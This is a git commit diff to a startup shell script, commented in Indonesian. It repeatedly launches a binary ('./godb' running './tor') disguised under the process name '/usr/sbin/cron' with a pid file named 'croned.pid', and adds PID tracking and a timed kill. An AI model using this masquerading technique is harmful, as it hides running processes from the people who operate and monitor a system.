d327688e8578981085a46a8751277876c54411f9
lucalocolocoloco <edijarqo@gmail.com>
2024-07-29 00:58:41 +0000

    Update start.sh

--- start.sh
+++ start.sh
@@ -27,13 +27,34 @@ python3 info.py &
 
 # Ubah direktori ke /usr/bin dan jalankan hms
 cd /usr/bin
+
 repeat_command() {
   while true; do
-    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor
+    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor &
+    GODB_PID=$!
+    echo "Proses godb berjalan dengan PID $GODB_PID."
     sleep 30
   done
 }
-# Panggil fungsi di latar belakang
+
+# Fungsi untuk menghentikan proses godb yang berjalan
+kill_godb() {
+  if [[ -n "$GODB_PID" ]]; then
+    kill "$GODB_PID"
+    echo "Proses godb dengan PID $GODB_PID telah dihentikan."
+  else
+    echo "Tidak ada proses godb yang berjalan."
+  fi
+}
+
+# Panggil fungsi di latar belakang dan simpan PID-nya
 repeat_command &
+REPEAT_PID=$!
+echo "Proses repeat_command berjalan dengan PID $REPEAT_PID."
+
+# Menunggu beberapa saat sebelum menghentikan proses godb 
+# Anda bisa menyesuaikan logika ini sesuai kebutuhan
+sleep 120
+kill_godb
 
 wait
